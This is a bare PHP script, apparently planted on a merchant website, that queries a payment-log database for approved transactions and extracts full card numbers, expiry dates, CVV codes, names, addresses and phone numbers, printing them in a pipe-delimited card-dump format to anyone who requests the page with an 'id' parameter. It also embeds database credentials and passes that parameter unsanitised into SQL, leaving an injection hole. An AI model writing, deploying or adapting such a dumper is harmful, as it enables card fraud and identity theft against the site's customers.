<?
//echo date('m/d/Y', 	1295350747);




 error_reporting (E_ALL ^ E_NOTICE);
$con=mysqli_connect("localhost","amazingw_templa2","projectMroject680","amazingw_logs_tpt");
// Check connection
if (mysqli_connect_errno()) {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
}
function getStr($string,$start,$end){
        $str = explode($start,$string,2);
        $str = explode($end,$str[1],2);
        return $str[0];
    }
if(isset($_GET['id'])){
$id=$_GET['id'];
$result = mysqli_query($con,"SELECT * FROM tpt_request_rq_iorder_pmnt_cc where id > {$id} and post_response LIKE '%This transaction has been approved%';");

while($row = mysqli_fetch_array($result)) {
           $date = date('d-m-Y',$row['timestamp']);
           $num = getStr($row['log_post_string'],'x_card_num=','x_exp_date');
		   $m = getStr($row['log_post_string'],'x_exp_date=','x_card_code');
		   //$y = getStr($row['log_post_string'],'cc_year=','&');
		   $cvv = getStr($row['log_post_string'],'x_card_code=','x_invoice_num');
		   $fn = urldecode(getStr($row['log_post_string'],'x_first_name=','x_last_name'));
		   $ln = urldecode(getStr($row['log_post_string'],'x_last_name=','x_company'));
		   $add = urldecode(getStr($row['log_post_string'],'x_address=','x_city'));
		   $city = urldecode(getStr($row['log_post_string'],'x_city=','x_state'));
		   $state = getStr($row['log_post_string'],'x_state=','x_zip');
		   $zip = getStr($row['log_post_string'],'x_zip=','x_country');
		   $phone = getStr($row['log_post_string'],'x_phone=','x_address');
		   $country = getStr($row['log_post_string'],'x_country=','x_ship_to_first_name');
		   $full = $num."|".$m."|".$cvv."|".$fn."|".$ln."|".$add."|".$city."|".$state."|".$zip."|".$country."|".$phone;
           echo $date."|".$row['id']."|".$full;
           echo "<br>";
  
}

mysqli_close($con);
}
?>